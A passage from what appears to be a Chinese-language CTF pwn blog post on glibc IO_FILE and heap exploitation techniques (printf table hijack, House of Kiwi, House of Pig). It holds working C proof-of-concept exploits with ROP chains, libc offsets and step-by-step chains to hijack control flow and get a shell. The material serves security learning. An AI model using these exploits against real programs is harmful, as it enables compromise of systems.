class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lxn&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">  <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">//__printf_arginfo_table =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="House-of-Kiwi"><a href="#House-of-Kiwi" class="headerlink" title="House of Kiwi"></a>House of Kiwi</h2><p>当程序正常调用 <code>exit</code> 退出时可以通过劫持 <code>vtable</code> 上的 <code>_IO_overflow</code> 来实现程序流劫持，例如 FSOP 。然而，如果程序调用 <code>_exit</code> 退出，那么将不会进行 IO 相关的清理工作，而是直接进行系统调用。因此需要主动触发异常退出来调用 <code>vtable</code> 上的相关函数，这就衍生出了 House of Kiwi 这一攻击手法。</p>
<p>在 <code>sysmalloc</code> 中，有一个检查 top chunk 页对齐的代码片段：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>

<p>通过调试可知，如果满足条件会调用 <code>__malloc_assert</code> ，而 <code>__malloc_assert</code> 会调用 <code>fflush (stderr);</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>fflush</code> 最终会调用 <code>_IO_fflush</code> ，其中 <code>result = _IO_SYNC (fp) ? EOF : 0;</code> 这行代码对应汇编如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/39187563c35d7122ff76a13a3385beed.png"
                     
                ><br>其中 rbp 指向 <code>_IO_file_jumps_</code> ，因此 <code>call [rbp + 0x60]</code> 调用的是 <code>_IO_new_file_sync</code> ，并且 <code>_IO_file_jumps_</code> 可写。因此只需要将 <code>_IO_file_jumps_</code> 对应 <code>_IO_new_file_sync</code> 函数指针的位置覆盖为 one_gadget 就可以获取 shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/1dd95a4866c19726c0030b5d916885c6.png"
                     
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/978037c3d39cd3aa46667a9482a3f9d3.png"
                     
                ><br>不过如果对于禁用 <code>execve</code> 的程序需要借助 <code>setcontext+61</code> + rop 或 shellcode 进行 orw 。<br>其中 <code>setcontext+61</code> 汇编如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000050C0D mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000050C14 mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000050C1B mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000050C1F mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000050C23 mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000050C27 mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000050C2B mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000050C2F test    dword ptr fs:48h, 2</span><br><span class="line">.text:0000000000050C3B jz      loc_50CF6</span><br><span class="line">...</span><br><span class="line">.text:0000000000050CF6 loc_50CF6:                              ; CODE XREF: setcontext+6B↑j</span><br><span class="line">.text:0000000000050CF6 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000050CFD push    rcx</span><br><span class="line">.text:0000000000050CFE mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000050D02 mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000050D06 mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000050D0D mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000050D11 mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000050D15 mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000050D15 ; &#125; // starts at 50BD0</span><br><span class="line">.text:0000000000050D1C ; __unwind &#123;</span><br><span class="line">.text:0000000000050D1C xor     eax, eax</span><br><span class="line">.text:0000000000050D1E retn</span><br></pre></td></tr></table></figure></div>

<p>可以看到，寄存器都是根据 rdx 指向的内存区域进行设置的，而根据前面的调试可知，调用 <code>_IO_new_file_sync</code> 时 rdx 指向的是 <code>_IO_helper_jumps_</code> 结构（注意，内存中有不止一个 <code>_IO_helper_jumps_</code> ，具体是哪一个要通过调试确定。），该结构同样可写。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/60bb92dc6cddf372e7022318692210a0.png"
                     
                ><br>因此可以通过修改 <code>_IO_helper_jumps_</code> 中的内容来给寄存器赋值。<br>以 rop 方法为例，需要设置 rsp 指向提前布置号的 rop 的起始位置，同时设置 rip 指向 <code>ret</code> 指令。最后劫持程序流实现 orw 。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_kiwi" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x2da82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x107191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x37bba</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x446d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x88236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x50bd0</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_helper_jumps = libc_base + <span class="number">0x1f3980</span>; <span class="comment">// _IO_helper_jumps</span></span><br><span class="line">  </span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line"></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA0</span>/<span class="number">8</span>) = (<span class="type">size_t</span>)ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line"> </span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>实际上 <code>__malloc_assert </code> 函数中在 <code>fflush</code> 前调用的 <code>__fxprintf </code> 中也调用了 vtable 中的相关函数，不过由于此时的 rdx 指向没有指向可控内存，还需要一个 rdi 转 rdx 的 gadget 。后面的 house of emma 就是利用了这条攻击链。</p>
<p>glibc-2.36 的 <code>__malloc_assert</code> 发生重大改变，直接通过系统调用不走 IO，该方法失效。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  __libc_message (do_abort, <span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fatal glibc error: malloc assertion failure in %s: %s\n&quot;</span>,</span><br><span class="line">		  function, assertion);</span><br><span class="line">  __builtin_unreachable ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/3279bc7caeba02a85f8abfb52a8435df.png"
                     
                ></p>
<h2 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h2><p>xctf final <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house%20of%20pig" >同名题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，题目条件太多这里只讲思路。<br>tcache stash unlink 可以实现任意地址申请内存，但是这种方法的前提是同时有 calloc 和 malloc 两种申请内存的方式。对于只能 calloc 申请内存的题目，还需要结合 large bin attack 手法劫持 <code>_IO_list_all</code> 然后伪造 IO_FILE 结构体从而劫持 <code>vtable</code> 到 <code>_IO_str_jumps</code> 上，进而在程序退出时利用 <code>_IO_str_overflow</code> 的 <code>malloc</code> 完成 tcache stash unlink 攻击，利用 <code>memcpy</code> 在 <code>__free_hook</code> 写入 <code>system</code> 函数地址，利用 <code>free</code> 获取 shell 。</p>
<p> 首先利用 1 次 UAF 修改 small bin 中 chunk 的 bk 指针使其指向 <code>__free_hook - 0x20</code>，然后利用 large bin attack 修改 <code>__free_hook</code> 所在 fake chunk 的 bk 指针指向 large bin 中的 chunk ，从而 tcache stash unlink 的触发条件。<br> 除此之外，还要再次利用 large bin attack 修改 <code>_IO_list_all</code> 指向 large bin 中的 chunk 。为后面劫持 IO_FILE 做准备。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/5d679c89682963d46efd9ce65e9ade29.png"
                     
                ><br> 通过 calloc 触发 stash 将 <code>__free_hook</code> 所在 fake chunk 链入 tcache 。之后再将 <code>_IO_list_all</code> 指向的 chunk 申请出来，并在里面伪造 IO_FILE 结构体。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/53378ee630a5729d6db2e82e939207c2.png"
                     
                ><br>函数在退出时会调用 <code>_IO_flush_all_lockp</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">	...</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>为了让 <code>_IO_flush_all_lockp</code> 能够调用执行到 <code>_IO_OVERFLOW</code> 从而调用 <code>_IO_str_overflow</code> ，需要满足如下条件：</p>
<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<p>由于 vtable 被劫持，程序之后会执行到 <code>_IO_str_overflow</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      <span class="built_in">free</span> (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先注意 <code>_flag</code> 的值（通常设为 0），避免提前从函数返回。之后程序执行到下面这个关键位置。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">...</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">...</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>_IO_blen</code> 定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure></div>

<p>此时程序执行 <code>malloc</code> 函数完成 tcache stash unlink 攻击将 <code>__free_hook</code> 所在的 fake chunk 申请出来，随后执行 <code>memcpy</code> 函数，将 <code>fp-&gt;_IO_buf_base</code> 和 <code>fp-&gt;_IO_buf_end</code> 之间的数据复制到 <code>__free_hook</code> 所在 fake chunk 中，将 <code>__free_hook</code> 覆盖为 <code>system</code> 函数地址。最后将 <code>fp-&gt;_IO_buf_base</code> 指向的地址即 <code>/bin/sh</code> 字符串地址作为参数传入 <code>free</code> 函数得到 shell 。</p>
<p>glibc-2.34 起取消了 ptmalloc 中的各种 hook，但是仍然可以利用 house of pig 实现任意地址写任意值，借助其他手段完成 get shell 。</p>
<p>例如<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/eznoted2b1405e" >这道题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。观察发现，<code>_IO_str_overflow</code> 中的 <code>memcpy</code> 实际上是通过 got 表调用的，因此我们可以构造多个 _IO_FILE 链将 <code>memcpy@got</code> 改写成 <code>system</code> 函数地址然后调用 <code>memcpy</code> 实现 get shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/957c20f5f1a3136e9e9d5ec880a4c8fb.png"
                     
                ><br>一种构造方案如上图所示，四个 _IO_FILE 作用如下：</p>
<ul>
<li>第一个 _IO_FILE 调用 <code>_IO_str_overflow</code> 中的 <code>free</code> 函数将 <code>tcache_perthread_struct</code> 释放实现一次 House of IO 。</li>
<li>第二次 _IO_FILE 首先调用 <code>_IO_str_overflow</code> 中的 <code>malloc</code> 将 <code>tcache_perthread_struct</code> 申请出来，然后调用 <code>memcpy</code> 控制 <code>tcache_perthread_struct</code> 中的数据，使得其中的 <code>entires</code> 指向 <code>&amp;memcpy@got - 0x10</code> 。</li>
